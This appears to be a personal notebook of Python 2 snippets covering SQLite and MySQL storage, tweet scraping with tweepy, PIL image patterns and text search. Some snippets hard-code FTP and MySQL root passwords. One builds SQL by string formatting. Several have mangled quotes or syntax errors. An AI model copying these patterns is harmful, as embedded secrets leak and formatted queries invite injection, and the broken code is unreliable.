id:1

My first note.

----
id:2

import sqlite3
import GraphicJunkdb
conn = sqlite3.connect('GraphicJunk.db')
c = conn.cursor()
c.execute('CREATE TABLE pixel(id)')
c.execute('CREATE TABLE tupples(R, G, B)')
c.execute('CREATE TABLE alpha(A)')
c.execute('CREATE TABLE XY(x, y)')
c.execute('CREATE TABLE NOTES(notes)')
c.execute('CREATE TABLE CODE(code,keywords)')
c.execute('CREATE TABLE association(X, Y, Z)')
conn.commit()
GraphicJunkdb.getcolumns('GraphicJunk.db')
----
id:3

import numpy as np
from PIL import Image
img2 = Image.open('tree.jpg')
img3 = img2.resize((400,400), Image.BICUBIC)
img3.save('tree3.jpg')
img2 = Image.open('tree3.jpg').convert('1', dither=Image.NONE)
img3 = img2.resize((400,400), Image.BICUBIC)
OUTPUT_IMAGE_SIZE = (400, 400)
img = Image.new('RGB', OUTPUT_IMAGE_SIZE, color='white')
a_img = np.asarray(img3) * 255
# do some stuff with buffer
a_img = abs(a_img - 255)  
img.putdata(a_img.flatten())
img
----
id:4

#Note r g b values are 0, 255,0* 
from PIL import Image
import math
inc = 0
img = Image.new('RGB', [640,640], 0x000000)
color = (0, 0, 55)
colors = (50, 25, 255)
for x in range(640):
    for y in range(640):
        #print x,y
        inc = inc+1
        if math.cos(float(x+inc)) >= math.cos(float(y+inc**2)):
            img.putpixel((x,y),(color))
        if math.cos(float(x+inc**3)) >= math.cos(float(y+inc**2)):
            img.putpixel((x,y),(colors))       
img.save('denim2.jpg')
img
----
id:5

#Note r g b values are 0, 255,0* 
from PIL import Image
import math
inc = 0
TOT = []
img = Image.new('RGB', [640,640], 0x000000)
color = (0, 0, 55)
colors = (50, 25, 255)
colorw = (255, 225, 0)
for x in range(640):
    for y in range(640):
        #print x,y
        inc = inc+1
        if math.cos(float(x+inc)) >= math.cos(float(y+inc**2)):
            img.putpixel((x,y),(color))
        if math.cos(float(x+inc**3)) >= math.cos(float(y+inc**2)):
            img.putpixel((x,y),(colors))
        #if math.cos(float(x+inc**3))+ math.cos(float(y+inc**2))==0:
        if (math.cos(float(x))+ math.cos(float(y))) >0 and (math.cos(float(x))+ math.cos(float(y)))<.21:
            img.putpixel((x,y),(colorw))
img.save('denim2.jpg')
img
        
----
id:6

delimiters = ['
', ' ', ',', '.', '?', '!', ':', 'and_what_else_you_need']
words = content
for delimiter in delimiters:
    new_words = []
    for word in words:
        new_words += word.split(delimiter)
    words = new_words

----
id:7

def insert_info(store):
    with sqlite3.connect("misc.db") as db:
        #use a text_factory that can interpret 8-bit bytestrings 
        db.text_factory = str
        cursor = db.cursor()
        #db.text_factory = str
        sql = "insert into storeit (data0, data1, data2) values (?, ?, ?)"
        cursor.execute(sql, store)
        db.commit()
        
        OR
        conn.text_factory = str

----
id:8

import sqlite3
import sys
conn = sqlite3.connect('snippet.db')
conn.text_factory = str
c = conn.cursor()
count=0
req=200
search = raw_input("Search")
#for row in c.execute('SELECT rowid,* FROM tweets WHERE text MATCH %s' % search):
for row in c.execute('SELECT * FROM snippet WHERE keywords MATCH ?', (search,)):    
    count=count+1
    #print count,"by",(row)[2],"
",(row)[1],"
"
    print count,"-",(row)[1]," -- by",(row)[2],"
"
    if count > req:
        conn.close()
        sys.exit()

----
id:9

with open("Use.txt",'r') as f:
    get_all=f.readlines()

----------------
with open("file.txt",'w') as f:
    for i,line in enumerate(get_all,1):  ## STARTS THE NUMBERING FROM 1 (by default it begins with 0)    
        if i == 2:                       ## OVERWRITES line:2
            f.writelines("XXXXXXXXXXXXXXXXXXXXXXX
")
        else:
            f.writelines(line)

----
id:10

%%writefile Key.py
def twiter():
    CONSUMER_KEY = 'WWWWWWWWWWWWWWWW'
    CONSUMER_SECRET = 'XXXXXXXXXXXXXXXXX'
    ACCESS_KEY = 'YYYYYYYYYYYYYYYYYYY'
    ACCESS_SECRET = 'ZZZZZZZZZZZZZZZZ'
    twir = (CONSUMER_KEY, CONSUMER_SECRET, ACCESS_KEY, ACCESS_SECRET)
    return twir

----
id:11

from itertools import tee
count=0
with open("symmetrymag_tweets.csv") as inf:
    for line in inf:
        lines  = line[39:]
        outf = open("symmetrymag.txt", "a") 
        outf.write(lines)
outf.close() 

----
id:12

search = raw_input("find : ")
file = open("symmetrymag.txt")
lines = file.readlines()
for line in lines:
    if search in line:print line
    if search == True:
        file.close()
        exit()
file.close()


----
id:13

import sqlite3
import time
#account = "TEDTalks.txt"
account = "symmetrymag.txt"
#account = "elonmusk.txt"
#account = "realDonaldTrump.txt"
user = account[:-4]
lines = open(account,"r")
line = lines.readline()
for line in lines:
    conn = sqlite3.connect('collection.db')
    conn.text_factory = str
    c = conn.cursor()
    c.execute("INSERT INTO tweets VALUES (?,?)", (line, user)) 
    conn.commit()
    conn.close()        
    
    #print line         

conn.commit()
conn.close()                 

----
id:14

import Key
from random import randint

#Twitter API credentials
consumer_key = Key.twiter()[0]
consumer_secret = Key.twiter()[1]
access_key = Key.twiter()[2]
access_secret = Key.twiter()[3]


def get_all_tweets(screen_name):
    #Twitter only allows access to a users most recent 3240 tweets with this method

    #authorize twitter, initialize tweepy
    auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
    auth.set_access_token(access_key, access_secret)
    api = tweepy.API(auth)


----
id:15

conn = GetSqliteConnection(db_path)
conn.text_factory = lambda x: unicode(x, 'utf-8', 'ignore')

----
id:16

%%writefile /home/jack/hidden/Authorize.py
def keys():
    ftp = "ftp.MYsite.com"
    username = "Josephine"
    password = "WhaWah2525"
    login = (ftp,username,password)
    return login
    ------------
import sys
sys.path.insert(0, "/home/jack/hidden"
import Authorize
ftp = Authorize.keys()[0]
username = Authorize.keys()[1]
password = Authorize.keys()[2]

print ftp, username, password    
    

----
id:17

!sqlite3 ipydb.db "pragma integrity_check;"

----
id:18

import base64
string="This is the text above Encoded Base64"
encodedlistvalue=base64.b64encode(string)

string = encodedlistvalue
print encodedlistvalue,"
",base64.b64decode(string)

----
id:19

import base64 #encode muliple lines and keep the format
string = 
╲╲╭━━━━━━━╮╱╱
╲╭╯╭━╮┈╭━╮╰╮╱
╲┃┈┃┈▊┈┃┈▊┈┃╱
╲┃┈┗━┛┈┗━┛┈┃╱
╱┃┈┏━━━━━┓┈┃╲
╱┃┈┃┈┈╭━╮┃┈┃╲
╱╰╮╰━━┻━┻╯╭╯╲
╱╱╰━━━━━━━╯╲╲ FROM: http://copy.r74n.com/ascii-art
EncodedStringValue=base64.b64encode(string)
string2 = EncodedStringValue
print "Decoded String2 : ",base64.b64decode(string2)

----
id:20

import sqlite3
conn = sqlite3.connect('ipydb.db')
c = conn.cursor()# Never 
for row in c.execute('SELECT * FROM python ORDER BY code'):
        print"entry :",(row[0]).encode('ascii'),"
"
        print"keywords :",(row[1]).encode('ascii'),"
-----
","
"  
        #data = c.fetchall()
        #print data

----
id:21

import sqlite3
import feedparser
import time
import sqlite3
Dbase = 'bigfeedfts.db'
conn = sqlite3.connect(Dbase)
c = conn.cursor()
c.execute(
CREATE VIRTUAL TABLE IF NOT EXISTS bbctech 
USING FTS3(head, feed);
)
count=0
while count<35:
    count=count+1
    if count==1:feed='http://feeds.bbci.co.uk/news/technology/rss.xml'
    if count==2:feed='http://www.cbn.com/cbnnews/us/feed/'
    d = feedparser.parse(feed)
    for post in d.entries:
        aa = `d['feed']['title'],d['feed']['link'],d.entries[0]['link']`
        bb = `post.title + ": " + post.link + ""`
        conn = sqlite3.connect(Dbase)
        c = conn.cursor()
        c.execute("INSERT INTO bbctech VALUES (?,?)", (aa,bb))
        conn.commit()
        conn.close()
        
        
conn = sqlite3.connect(Dbase)
c = conn.cursor()# Never
count=0
for row in c.execute('SELECT * FROM bbctech ORDER BY rowid DESC'):
    row=str(row)
    row=row.replace("(u","");row=row.replace('", u"u',"
")
    row=row.replace("/', u'","   ");row=row.replace('"',"")
    row=row.replace("', u'","  ");row=row.replace("')","  ")
    row=row.replace("'","");row=row.replace("  , uu","
")
    count=count+1
    print"
Number :",count," -----
",(row)

----
id:22

import sqlite3
import sys
conn = sqlite3.connect('bigfeedfts.db')
c = conn.cursor()
count=0
# Limited Amount of Results to 100
req=100
term = raw_input("Search Term : ")
for row in c.execute("SELECT * FROM bbctech WHERE feed MATCH ?", (term,)):
    row=str(row)
    row=row.replace("(u"(u","");row=row.replace("', u'","  ");
    row=row.replace("u'"," ");row=row.replace(')", u" ', "
");
    row=row.replace(" http://","
http://");row=row.replace('")','')
    row=row.replace("'","");row=row.replace("#tk.rss_all", "")
    count=count+1
    print "
",count,"-----
",(row)
    if count > req:
        conn.close()
        sys.exit()

----
id:23

#This is a great search
#Much better that a regular browser search. 
#This search keeps a google page that may be scrapedor gleaned or just used as a hyperlink documant. 
#Results are fantastic.
from bs4 import BeautifulSoup
import requests
url = u'https://www.google.com/search?num=30&newwindow=1&client=ubuntu&channel=fs&btnG=Search&q='
query = u'Trump, idiot '
r = requests.get(url+query)
soup = BeautifulSoup(r.text, 'html.parser')
for list in soup:
    print list
text = str(list)
html_str = text
Html_file= open("filename4.html","w")
Html_file.write(html_str)
Html_file.close()#This is a great search
#Much better that a regular browser search. 
#This search keeps a google page that may be scrapedor gleaned or just used as a hyperlink documant. 
#Results are fantastic.
from bs4 import BeautifulSoup
import requests
url = u'https://www.google.com/search?num=30&newwindow=1&client=ubuntu&channel=fs&btnG=Search&q='
query = u'Trump, idiot '
r = requests.get(url+query)
soup = BeautifulSoup(r.text, 'html.parser')
for list in soup:
    print list
text = str(list)
html_str = text
Html_file= open("filename4.html","w")
Html_file.write(html_str)
Html_file.close()
-----
READ THE HTML
from lxml import html
print html.parse('filename4.html').xpath('//body')[0].text_content()

----
id:24

from PIL import Image, ImageFont
import GenIm

img = Image.open('tmmpp/HURRICANE_01.png')
position = (340,600)
text= "JackNorthrup_ImageBot"
font = ImageFont.truetype("/home/jack/.fonts/Exo-Black.ttf", 25)
col = (255,255,255,150)
halo_col = (0,0,0)
newim = GenIm.Draw_text_with_halo(img, position, text, font, col, halo_col)
newim.save("tmmpp/HURRICANE_02.png")
!showme tmmpp/HURRICANE_02.png

----
id:25

from itertools import tee
count=0
with open("realDonaldTrump_tweets.csv") as inf:
    # set up iterators
    cfg,res = tee(inf)
    # advance cfg by four lines
    for i in range(4):
        next(cfg)

    for c,r in zip(cfg, res):
        count=count+1
        if "campaign" in c:
            #print "Date :",c[21:]
            print c[39:]

----
id:26

import tweepy #https://github.com/tweepy/tweepy
import csv
import sys
sys.path.insert(0,"/home/jack/anaconda2/envs/py27/lib/python2.7/site-packages")
import Key
from random import randint
consumer_key = Key.twiter()[0]
consumer_secret = Key.twiter()[1]
access_key = Key.twiter()[2]
access_secret = Key.twiter()[3]

def get_all_tweets(screen_name):
    auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
    auth.set_access_token(access_key, access_secret)
    api = tweepy.API(auth)
    alltweets = []	
    new_tweets = api.user_timeline(screen_name = screen_name,count=200)
    alltweets.extend(new_tweets)
    oldest = alltweets[-1].id - 1
    while len(new_tweets) > 0:
        print "getting tweets before %s" % (oldest)
        new_tweets = api.user_timeline(screen_name = screen_name,count=200,max_id=oldest)
        alltweets.extend(new_tweets)
        oldest = alltweets[-1].id - 1
        print (len(alltweets))
        if (len(alltweets)) >200:
            outtweets = [[tweet.id_str, tweet.created_at, tweet.text.encode("utf-8")] for tweet in alltweets]
            with open('%s_tweets.csv' % screen_name, 'wb') as f:
                writer = csv.writer(f)
                writer.writerow(["id","created_at","text"])
                writer.writerows(outtweets)
            pass
if __name__ == '__main__':
    USER = raw_input("User  : ") or "CNN"
    get_all_tweets(USER)
---  
get all tweets, csv, get many tweets, tweets to csv, tweets.csv    

----
id:27

# TOP ONE IS BEST
textin= open('hashtag.txt', 'r')
lines = textin.readlines()
for line in lines:
    time.sleep(1)
    print line
---
import time
textin= open('hashtag.txt', 'r')
lines = textin.read()
time.sleep(1)
print lines,
---
textin= open('hashtag.txt', 'r')
lines = textin.read().splitlines()
time.sleep(1)
print lines,
---
read line by line, read(), splitlines(), read().splitlines(), read files    

----
id:28

import markovify
f = open("grimm.txt")
text = f.read()
text_model_a = markovify.Text(text)


ebook_b =open('hekel.txt')
text0 = ebook_b.read()
text_model_b = markovify.Text(text0)
for i in range(5):
    print(text_model_b.make_short_sentence(140))
    STR0 = (text_model_b.make_short_sentence(140))
    savE = open('savE.txt', 'a')
    savE.write(STR0)
    savE.close()

# 2. Print five randomly-generated sentences
for i in range(5):
    print(text_model_a.make_short_sentence(140))
    STR = (text_model_a.make_short_sentence(140))
    savE = open('savE.txt', 'a')
    savE.write(STR)
    savE.close()
# 3. Print three randomly-generated sentences of no more than 140 characters
for i in range(5):
    print(text_model_a.make_short_sentence(140))
    STR2 = (text_model_a.make_short_sentence(140))
    savE = open('savE.txt', 'a')
    savE.write(STR2)
    savE.close()
# Combine the models into a single one
both_models = markovify.combine([text_model_a,text_model_b])
for i in range(5):
    print(both_models.make_short_sentence(140))    
    STR3 = (both_models.make_short_sentence(140))  
    savE = open('savE.txt', 'a')
    savE.write(STR3)
    savE.close()    
---
markovify , combine , text_model_a ,

----
id:29

Using shutil

from shutil import copyfile
copyfile(src, dst)
----
# Python Copy File - Sample Code
from shutil import copyfile
from sys import exit
source = input("Enter source file with full path: ")
target = input("Enter target file with full path: ")
# adding exception handling
try:
    copyfile(source, target)
except IOError as e:
    print("Unable to copy file. %s" % e)
    exit(1)
except:
    print("Unexpected error:", sys.exc_info())
    exit(1)
print("
File copy done!
")
while True:
    print("Do you like to print the file ? (y/n): ")
    check = input()
    if check == 'n':
        break
    elif check == 'y':
        file = open(target, "r")
        print("
Here follows the file content:
")
        print(file.read())
        file.close()
        print()
        break
    else:
        continue

----
id:30

how to turn on the keyboard backlight

USE:   xset led on

keyboard backlight

----
id:31

import sqlite3
import os.path
from os import listdir, getcwd
from IPython.core.display import Image 

def get_picture_list(rel_path):
    abs_path = os.path.join(os.getcwd(),rel_path)
    print 'abs_path =', abs_path
    dir_files = os.listdir(abs_path)
    #print dir_files
    return dir_files

picture_list = get_picture_list('snippets')
print picture_list
------------
get_picture_list, get list of files, get a file list in memory
files in memeory , file list memory 

----
id:32

import sqlite3
import sys
conn = sqlite3.connect('pdfs.db')
conn.text_factory = str
c = conn.cursor()
count=0;req=200
search = raw_input("Search : ")
for row in c.execute('SELECT rowid, text FROM pdfs WHERE text MATCH ?', (search,)):    
    count=count+1
    print (row)[0],"-",(row)[1],
    if count > req:
        conn.close()
        sys.exit()
        
 --------
 search database, search db, raw_input, SQLite search
        

----
id:33

Creating a MySQL database with Python
If you don't have it you may need:
sudo apt-get install libmysqlclient-dev

# Works
import MySQLdb as db
con = db.connect("localhost","root","")
cur = con.cursor()
cur.execute('CREATE DATABASE searchdb01;')


----
id:34

# works 
import MySQLdb as db
import json 
import base64
    
con = db.connect("localhost","root","ThinkPadT$#", "searchdb01")
file = ""[mylist.jsn
while 1:
    line = file.readline()
    if not line:
        break
    pass # do something 
#listname='mylist.json'
#stringlistvalue=json.dumps(listname)
""
keywords = ""
database, code, python, lesson 1, Oh234
""
encodedlistvalue=base64.b64encode(file)
with con:
    cur = con.cursor()
    cur.execute("CREATE TABLE Code(Id INT PRIMARY KEY AUTO_INCREMENT,                   Name VARCHAR(2500), Keywords VARCHAR(500))")
    #cur.execute("INSERT INTO Code(Name) VALUES('%s')" % (encodedlistvalue))
    cur.execute("INSERT INTO Code(Name, Keywords) VALUES('%s','%s')" % (encodedlistvalue, keywords))

----
id:35

#!/usr/bin/python
import MySQLdb
import sys
import base64
con = db.connect("localhost","root"," ", "searchdb01")
cur = con.cursor()
# execute the SQL query using execute() method.
cur.execute ("select Id, Name, Keywords from Code")

data = cur.fetchall ()
# print the rows
for row in data :
    encodedlistvalue=base64.b64decode(row[1])
    print row[0], encodedlistvalue, '
', 'Keywords:', row[2],    '
 -----------------------------
'
# close the cursor object
cur.close ()
# close the connection
con.close ()
# exit the program
sys.exit()

----
id:36

import MySQLdb
con = db.connect("localhost","root","ThinkPadT$#", "searchdb01")

param = "lesson"
c = con.cursor()
c.execute("SELECT * FROM Code WHERE Keywords LIKE %s LIMIT 1", ("%" + param + "%",))

data = c.fetchall()
for row in data :
    encodedlistvalue=base64.b64decode(row[1])
    print row[0], encodedlistvalue, '
', 'Keywords:', row[2],    '
 -----------------------------
'
c.close()

----
id:37

def createdb(dbnew):
    import sqlite3
    conn = sqlite3.connect(dbnew)
    c = conn.cursor()
  
    query1 = "DROP TABLE IF EXISTS Junk"
    query2 = ""CREATE TABLE IF NOT EXISTS Junk(
    "language" VARCHAR(32) NOT NULL,
    "keywords" VARCHAR(500) default NULL,
    "script" VARCHAR(2500) default NULL
    )
    ""
    c.execute(query1)
    c.execute(query2)
    
dbnew = "newdb.db"    
createdb(dbnew)    

----
id:38

import sqlite3
import os.path
from os import listdir, getcwd
from IPython.core.display import Image 

def get_picture_list(rel_path):
    abs_path = os.path.join(os.getcwd(),rel_path)
    print 'abs_path =', abs_path
    dir_files = os.listdir(abs_path)
    #print dir_files
    return dir_files

picture_list = get_picture_list('snippets')
print picture_list
import sqlite3
import os.path
from os import listdir, getcwd
from IPython.core.display import Image 

def create_or_open_db(db_file):
    db_is_new = not os.path.exists(db_file)
    conn = sqlite3.connect(db_file)
    if db_is_new:
        print 'Creating schema'
        sql = '''create table if not exists PICTURES(
        ID INTEGER PRIMARY KEY AUTOINCREMENT,
        PICTURE BLOB,
        TYPE TEXT,
        FILE_NAME TEXT);'''
        conn.execute(sql) # shortcut for conn.cursor().execute(sql)
    else:
        print 'Schema exists
'
    return conn

def insert_picture(picture_file):
    with open(picture_file, 'rb') as input_file:
        conn = sqlite3.connect(dbname)
        c = conn.cursor()
        ablob = input_file.read()
        base=os.path.basename(picture_file)
        afile, ext = os.path.splitext(base)
        sql = '''INSERT INTO PICTURES
        (PICTURE, TYPE, FILE_NAME)
        VALUES(?, ?, ?);'''
        c.execute(sql,[sqlite3.Binary(ablob), ext, afile]) 
        conn.commit()

def loadimages(dbname, path):
    conn = sqlite3.connect(dbname)
    c = conn.cursor()
    #conn.execute("DELETE FROM PICTURES")
    for fn in picture_list:
        picture_file = path+"/"+fn
        insert_picture(picture_file)

    for r in c.execute("SELECT rowid, FILE_NAME FROM PICTURES"):
        print r[0],r[1]
   
    conn.commit()


def get_image(picture_id):
    conn = sqlite3.connect(dbname)
    c = conn.cursor()
    c.execute("SELECT PICTURE, TYPE, FILE_NAME FROM PICTURES WHERE id = ?;",(picture_id,))
    #sql = "SELECT PICTURE, TYPE, FILE_NAME FROM PICTURES WHERE id = 19"
    param = {'id': picture_id}
    #c.execute(sql, param)
    ablob, ext, afile = c.fetchone()
    filename = afile + ext
    with open(filename, 'wb') as output_file:
        output_file.write(ablob)
    return filename


dbname = "ImageC.db"
db_file = create_or_open_db(dbname)
path = "snippets/"
loadimages(dbname, path)
filename = get_image(16)
print filename
Image(filename=filename)

-----------------
store, retrieve images,SQLite Databasestore,
retrieve images, from SQLite , Database

----
id:39

try:
        mercury = wikipedia.summary("Mercury")
except wikipedia.exceptions.DisambiguationError as e:
        lines = str(e.options)
        lines=lines.replace("u'","");lines=lines.replace("', ","
")
        lines=lines.replace("[","");lines=lines.replace("]","")
        lines=lines.replace('u"','');lines=lines.replace('"','')
        with open("textwik.txt", "w")as f:
                f.write(lines) 
f.close()
bad_words = ['(disambiguation)', 'All pages']
with open('textwik.txt') as oldfile, open('usewik.txt', 'w') as newfile:
    for line in oldfile:
        if not any(bad_word in line for bad_word in bad_words):
            newfile.write(line)
            
---------------
wikipedia , bad_words, bad words, disambiguation, remove lines from text

----
id:40

%%writefile Image2SQLite.py
import sqlite3
import os.path
from os import listdir, getcwd
from IPython.core.display import Image 

def getImage_list(rel_path):
    abs_path = os.path.join(os.getcwd(),rel_path)
    print 'abs_path =', abs_path
    dir_files = os.listdir(abs_path)
    return dir_files

def create_or_open_db(dbname):
    db_is_new = not os.path.exists(db_file)
    conn = sqlite3.connect(db_file)
    if db_is_new:
        print 'Creating schema'
        sql = '''create table if not exists images(
        ID INTEGER PRIMARY KEY AUTOINCREMENT,
        image BLOB,
        TYPE TEXT,
        imagE TEXT);'''
        conn.execute(sql) # shortcut for conn.cursor().execute(sql)
    else:
        print 'Schema exists
'
        conn.commit()
        conn.close()
    return conn

def insertImage(dbname, imageFile):
    with open(imageFile, 'rb') as input_file:
        conn = sqlite3.connect(dbname)
        c = conn.cursor()
        ablob = input_file.read()
        base=os.path.basename(imageFile)
        afile, ext = os.path.splitext(base)
        sql = '''INSERT INTO images
        (image, TYPE, imagE)
        VALUES(?, ?, ?);'''
        c.execute(sql,[sqlite3.Binary(ablob), ext, afile]) 
        conn.commit()

def loadimagE(dbname, path):
    conn = sqlite3.connect(dbname)
    c = conn.cursor()
    #conn.execute("DELETE FROM images")
    for fn in image_list:
        imageFile = path+"/"+fn
        insertImage(imageFile)

    for r in c.execute("SELECT rowid, imagE FROM images"):
        print r[0],r[1]
   
    conn.commit()
    conn.close()

def image_id(dbname):
    conn = sqlite3.connect(dbname)
    c = conn.cursor()
    rows = c.execute("SELECT rowid, TYPE, imagE FROM images")
    for row in rows:
        print row[0],row[2]+row[1]    
    return
    
def get_image(dbname,image_id):
    conn = sqlite3.connect(dbname)
    c = conn.cursor()
    c.execute("SELECT image, TYPE, imagE FROM images WHERE id = ?;",(image_id,))
    #sql = "SELECT image, TYPE, imagE FROM images WHERE id = 19"
    param = {'id': image_id}
    #c.execute(sql, param)
    ablob, ext, afile = c.fetchone()
    filename = afile + ext
    with open(filename, 'wb') as output_file:
        output_file.write(ablob)
    return filename
---------------
USAGE:
import Image2Data
picture_list = Image2Data.get_picture_list('snippets')
print picture_list

import Image2Data
dbname = "ImageE.db"
Image2Data.create_or_open_db(dbname)

#insert one image
import Image2Data
dbname = "ImageD.db"
picture_file = "01.jpg"
Image2Data.insert_picture(dbname, picture_file)

import Image2Data
dbname = "ImageD.db"
path = "snippets"
loadimages(dbname, path)

def image_id(dbname):
    conn = sqlite3.connect(dbname)
    c = conn.cursor()
    rows = c.execute("SELECT rowid, TYPE, FILE_NAME FROM PICTURES")
    for row in rows:
        print row[0],row[2]+row[1]
    
#list images by id
dbname = "ImageD.db"
image_id(dbname)

#retrieve image by id
filename = get_image(dbname,1)
print filename
Image(filename=filename)



----
id:41

%%writefile Image2SQLite.py
import sqlite3
import os.path
from os import listdir, getcwd
from IPython.core.display import Image 

def getImage_list(rel_path):
    abs_path = os.path.join(os.getcwd(),rel_path)
    print 'abs_path =', abs_path
    dir_files = os.listdir(abs_path)
    return dir_files

def create_or_open_db(dbname):
    db_is_new = not os.path.exists(db_file)
    conn = sqlite3.connect(db_file)
    if db_is_new:
        print 'Creating schema'
        sql = '''create table if not exists images(
        ID INTEGER PRIMARY KEY AUTOINCREMENT,
        image BLOB,
        TYPE TEXT,
        imagE TEXT);'''
        conn.execute(sql) # shortcut for conn.cursor().execute(sql)
    else:
        print 'Schema exists
'
        conn.commit()
        conn.close()
    return conn

def insertImage(dbname, imageFile):
    with open(imageFile, 'rb') as input_file:
        conn = sqlite3.connect(dbname)
        c = conn.cursor()
        ablob = input_file.read()
        base=os.path.basename(imageFile)
        afile, ext = os.path.splitext(base)
        sql = '''INSERT INTO images
        (image, TYPE, imagE)
        VALUES(?, ?, ?);'''
        c.execute(sql,[sqlite3.Binary(ablob), ext, afile]) 
        conn.commit()

def loadimagE(dbname, path):
    conn = sqlite3.connect(dbname)
    c = conn.cursor()
    #conn.execute("DELETE FROM images")
    for fn in image_list:
        imageFile = path+"/"+fn
        insertImage(imageFile)

    for r in c.execute("SELECT rowid, imagE FROM images"):
        print r[0],r[1]
   
    conn.commit()
    conn.close()

def image_id(dbname):
    conn = sqlite3.connect(dbname)
    c = conn.cursor()
    rows = c.execute("SELECT rowid, TYPE, imagE FROM images")
    for row in rows:
        print row[0],row[2]+row[1]    
    return
    
def get_image(dbname,image_id):
    conn = sqlite3.connect(dbname)
    c = conn.cursor()
    c.execute("SELECT image, TYPE, imagE FROM images WHERE id = ?;",(image_id,))
    #sql = "SELECT image, TYPE, imagE FROM images WHERE id = 19"
    param = {'id': image_id}
    #c.execute(sql, param)
    ablob, ext, afile = c.fetchone()
    filename = afile + ext
    with open(filename, 'wb') as output_file:
        output_file.write(ablob)
    return filename
---------------
USAGE:
import Image2Data
picture_list = Image2Data.get_picture_list('snippets')
print picture_list

import Image2Data
dbname = "ImageE.db"
Image2Data.create_or_open_db(dbname)

#insert one image
import Image2Data
dbname = "ImageD.db"
picture_file = "01.jpg"
Image2Data.insert_picture(dbname, picture_file)

import Image2Data
dbname = "ImageD.db"
path = "snippets"
loadimages(dbname, path)

def image_id(dbname):
    conn = sqlite3.connect(dbname)
    c = conn.cursor()
    rows = c.execute("SELECT rowid, TYPE, FILE_NAME FROM PICTURES")
    for row in rows:
        print row[0],row[2]+row[1]
    
#list images by id
dbname = "ImageD.db"
image_id(dbname)

#retrieve image by id
filename = get_image(dbname,1)
print filename
Image(filename=filename)
------------
images to database , image2data , store images, store images as data, SQLite images


----
id:42

# Get number of words in a file
fname = raw_input("Enter file name: ")
num_words = 0
with open(fname, 'r') as f:
    for line in f:
        words = line.split()
        num_words += len(words)
print "Number of words: ",num_words
 

----
id:43

from time import sleep
topic = raw_input("Research : ")
fname = topic.replace(" ", "")+".txt"
fname = "Wiki_"+fname
f =open(fname, "w")
f.close()
import wikipedia
rows = wikipedia.search(topic)
for row in rows:
    sleep(1)
    para = wikipedia.summary(row)
    para = '

'.join((row, para)).encode('utf-8').strip()
    enter = open(fname, "a")
    enter.write(para)
    enter.close()
    print para
enter.close()

----
id:44

# %load SearchFilename.py
'''
Search a filename for a phrase and how many following lines to display
USAGE:
import SearchFilename
filename = "hek.txt"
length = 4
SearchFilename.searchfilename(filename, length)
'''
def searchfilename(filename, length):
    f = open(filename, "r")
    searchlines = f.readlines()
    f.close()
    search = str(raw_input("Search Phrase : "))
    for i, line in enumerate(searchlines):
        if search in line: 
            for l in searchlines[i:i+length]: print l,
            print
            
USAGE:
import SearchFilename
filename = "Automate-the-Boring-Stuff.txt"
# length = how many lines after
length = 4
SearchFilename.searchfilename(filename, length) 

------
search text file search file module import searchfile



----
id:45

import os
import timeit
def txsearch():
    # Ask to enter string to search
    Sstring = raw_input("Search Phrase")
    for fname in os.listdir('./'):
       # Apply file type filter   
       if fname.endswith(".txt"):
            # Open file for reading
            fo = open(fname)
            # Read the first line from the file
            line = fo.readline()
            # Initialize counter for line number
            line_no = 1
            # Loop until EOF
            while line != '' :
                    index = line.find(Sstring)
                    if ( index != -1) :
                        # Set some parameters no lines longer than 240 characters 
                        # or less than search phrase +30 characters 
                        if len(line)< 240 and len(line)> len(Sstring)+20 :
                            #print(fname, "[", line_no, ",", index, "] ", line)
                            #print fname,line[1:-8],"  "
                            print fname,line_no,line
                    # Read next line
                    line = fo.readline()  
                    # Increment line counter
                    line_no += 1
            # Close the files
            fo.close()
            

------
search text file search file module import searchfile



----
id:46

import sys
import tweepy
import csv
import Key

#pass security information to variables
consumer_key = Key.twiter()[0]
consumer_secret = Key.twiter()[1]
access_key = Key.twiter()[2]
access_secret = Key.twiter()[3]

#use variables to access twitter
auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_key, access_secret)
api = tweepy.API(auth)

#create an object called 'customStreamListener'
class CustomStreamListener(tweepy.StreamListener):

    def on_status(self, status):
        print (status.author.screen_name, status.created_at, status.text)
        # Writing status data
        with open('OutputStreaming.txt', 'a') as f:
            writer = csv.writer(f)
            #status.author.screen_name = status.author.screen_name.encode('UTF-8')
            #status.text.encode = status.text.encode('UTF-8')            
            writer.writerow([status.author.screen_name.encode('UTF-8'), status.created_at, status.text.encode('utf8')])


    def on_error(self, status_code):
        print >> sys.stderr, 'Encountered error with status code:', status_code
        return True # Don't kill the stream

    def on_timeout(self):
        print >> sys.stderr, 'Timeout...'
        return True # Don't kill the stream


    def titles():
        # Writing csv titles
        with open('OutputStreaming.txt', 'a') as f:
                    writer = csv.writer(f)
                    writer.writerow(['Author', 'Date', 'Text'])
            
def main():
    streamingAPI = tweepy.streaming.Stream(auth, CustomStreamListener())
    #with open("tokens.txt", "r") as f:
    with open("tokens2.txt", "r") as f:    
        tokens = f.readlines()

        streamingAPI.filter(track=tokens)
        #streamingAPI.filter(track=['Dallas', 'NewYork'])


        #status.text.encode('utf-8')
        #writer.writerow([unicode(s).encode("utf-8") for s in row])
        #writer.writerow([unicode('Author', 'Date', 'Text').encode("utf-8") for 'Author', 'Date', 'Text' in row])



----
id:47

def tidyt(in_string):    
    texout = in_string.replace("', u'", "  ");texout = texout.replace("\u2018", "")
    texout = texout.replace("\u2019 ", "");texout = texout.replace("%", "")
    texout = texout.replace("[u'", "");texout = texout.replace(" u'", "")
    texout = texout.replace(', u"', ' ');texout = texout.replace('",', ' ')
    texout = texout.replace("'", '');texout = texout.replace("Mr.  ", 'Mr. ')
    texout = texout.replace(",", '');texout = texout.replace(".", '')
    ftexout =texout.replace("']", "")
    return ftexout


----
id:48

from textblob import TextBlob
import random
import sys

# stdin's read() method just reads in all of standard input as a string;
# use the decode method to convert to ascii (textblob prefers ascii)
text = sys.stdin.read().decode('ascii', errors="replace")
blob = TextBlob(text)

short_sentences = list()
for sentence in blob.sentences:
    if len(sentence.words) <= 5:
        short_sentences.append(sentence.replace("
", " "))

for item in random.sample(short_sentences, 10):
	print item

----
id:49

Datetime objects ephem

    When creating an ephem.Date, you can specify the date as either a date or datetime object from the datetime standard Python module. You can also ask a PyEphem date to convert itself the other direction by calling its datetime() method.

    >>> from datetime import date, datetime
    >>> print(ephem.Date(datetime(2005, 4, 18, 22, 15)))
    2005/4/18 22:15:00

    >>> d = ephem.Date('2000/12/25 12:41:16')
